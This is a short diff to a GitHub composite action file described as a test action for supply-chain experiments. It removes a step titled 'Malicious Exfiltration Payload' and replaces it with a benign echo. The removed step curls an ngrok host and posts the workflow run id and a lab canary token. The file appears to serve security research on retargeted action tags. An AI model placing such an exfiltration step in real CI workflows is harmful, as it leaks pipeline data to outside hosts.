@@ -3,10 +3,6 @@ description: "Test action for supply chain experiments"
 runs:
   using: "composite"
   steps:
-    - name: Malicious Exfiltration Payload
+    - name: Default Action Behavior
+      run: echo "Benign action execution."
       shell: bash
-      run: |
-        echo "Simulating malicious code execution from retargeted tag..."
-        curl -X POST https://shortage-euphemism-gleeful.ngrok-free.dev/exfiltrate \
-          -H "Content-Type: application/json" \
-          -d "{\"run_id\": \"${{ github.run_id }}\", \"canary_token\": \"$LAB_CANARY\", \"scenario\": \"A1a\"}"
